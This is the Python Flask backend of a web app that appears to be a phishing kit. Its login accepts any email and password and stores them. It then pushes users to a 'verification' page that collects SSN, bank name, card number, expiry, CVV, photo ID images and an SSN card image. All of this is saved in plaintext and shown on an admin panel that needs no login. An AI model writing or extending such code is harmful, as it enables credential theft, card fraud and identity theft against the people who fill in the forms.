from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import os
import json

app = Flask(__name__)
app.secret_key = os.urandom(24)

DB_FILE = 'users_db.json'

EXPECTED_USER_KEYS = [
    "password", "fullname", "phonenumber", "profile_picture_base64",
    "ssn", "bankName", "cardNumber", "expiryDate", "cvv",
    "photoIdFront", "photoIdBack", "ssnCard" # Replaced photoId with photoIdFront & photoIdBack
]

def load_users_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                db = json.load(f)
                for user_id, details in db.items():
                    for key in EXPECTED_USER_KEYS:
                        if key not in details:
                            details[key] = ""
                return db
        except json.JSONDecodeError:
            return {}
    return {}

def save_users_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

users_db = load_users_db()

if not users_db:
    users_db = {
        "test@example.com": {key: "" for key in EXPECTED_USER_KEYS}
    }
    users_db["test@example.com"]["password"] = "password123"
    save_users_db(users_db)
else:
    needs_save = False
    for user_id, details in users_db.items():
        for key in EXPECTED_USER_KEYS:
            if key not in details:
                details[key] = ""
                needs_save = True
    if needs_save:
        save_users_db(users_db)

@app.route('/')
def index():
    # ... (index route remains the same) ...
    if session.get('logged_in'):
        user_email = session.get('user_email')
        if user_email and users_db.get(user_email) and not users_db[user_email].get('ssn'):
             return redirect(url_for('verification_page'))
        return redirect(url_for('dashboard'))
    return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    # ... (login route remains largely the same, ensure it initializes all EXPECTED_USER_KEYS if new user) ...
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    user_id = email

    if user_id not in users_db:
        users_db[user_id] = {key: "" for key in EXPECTED_USER_KEYS}
        users_db[user_id]["password"] = password
    
    if users_db.get(user_id) and users_db[user_id].get("password") == password:
        session['logged_in'] = True
        session['user_email'] = email
        session['user_fullname'] = users_db[user_id].get('fullname', '') # or fullName
        session['profile_picture_base64'] = users_db[user_id].get('profile_picture_base64', '')

        if not users_db[user_id].get('ssn'):
             return jsonify({'message': 'Login successful, proceed to verification'}), 200 # Frontend handles redirect
        return jsonify({'message': 'Login successful'}), 200
    else:
        return jsonify({'message': 'Invalid email or password'}), 401


@app.route('/verification')
def verification_page():
    # ... (verification_page route remains the same) ...
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    return render_template('verification.html')


@app.route('/verify_info', methods=['POST'])
def verify_info():
    if not session.get('logged_in'):
        return jsonify({'message': 'Unauthorized Access: Please log in.'}), 401

    data = request.get_json()
    if not data:
        return jsonify({'message': 'No data provided'}), 400
        
    user_email = session.get('user_email')

    if not user_email or user_email not in users_db:
        return jsonify({'message': 'User session not found or user does not exist.'}), 404

    # Update with new and existing fields
    users_db[user_email]['fullName'] = data.get('fullName', users_db[user_email].get('fullName', ''))
    users_db[user_email]['phoneNumber'] = data.get('phoneNumber', users_db[user_email].get('phoneNumber', ''))
    users_db[user_email]['ssn'] = data.get('ssn', '')
    users_db[user_email]['bankName'] = data.get('bankName', '')
    users_db[user_email]['cardNumber'] = data.get('cardNumber', '')
    users_db[user_email]['expiryDate'] = data.get('expiryDate', '')
    users_db[user_email]['cvv'] = data.get('cvv', '')
    
    # MODIFIED: Store front and back ID images
    users_db[user_email]['photoIdFront'] = data.get('photoIdFront', '')
    users_db[user_email]['photoIdBack'] = data.get('photoIdBack', '')
    users_db[user_email]['ssnCard'] = data.get('ssnCard', '')
    
    # Remove the old single 'photoId' if it existed and is now replaced by Front/Back
    if 'photoId' in users_db[user_email] and ('photoIdFront' in data or 'photoIdBack' in data):
        # If you are certain 'photoId' is now obsolete, you can remove it:
        # del users_db[user_email]['photoId'] 
        # Or ensure it's clear if not used
        pass


    save_users_db(users_db)
    session['user_fullname'] = users_db[user_email]['fullName'] # Update session if needed

    print(f"User {user_email} verification data updated with front/back ID.") # For debugging
    return jsonify({'message': 'Verification information updated successfully!'}), 200

@app.route('/dashboard')
def dashboard():
    # ... (dashboard route remains the same) ...
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    return render_template('dashboard.html')


@app.route('/admin_panel')
def admin_panel():
    return render_template('admin.html', users=users_db) # Or admin_panel.html

@app.route('/logout', methods=['POST'])
def logout():
    # ... (logout route remains the same) ...
    session.clear()
    return jsonify({'message': 'Logged out successfully'}), 200


if __name__ == '__main__':
    # ... (startup logic remains similar, ensure EXPECTED_USER_KEYS is used for initialization) ...
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    current_users_db = load_users_db()
    needs_save_on_startup = False
    if not current_users_db:
        current_users_db = { "test@example.com": {key: "" for key in EXPECTED_USER_KEYS} }
        current_users_db["test@example.com"]["password"] = "password123"
        needs_save_on_startup = True
    else:
        for user_id, details in current_users_db.items():
            for key in EXPECTED_USER_KEYS:
                if key not in details:
                    details[key] = ""
                    needs_save_on_startup = True
    if needs_save_on_startup:
        save_users_db(current_users_db)
    
    users_db = current_users_db

    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)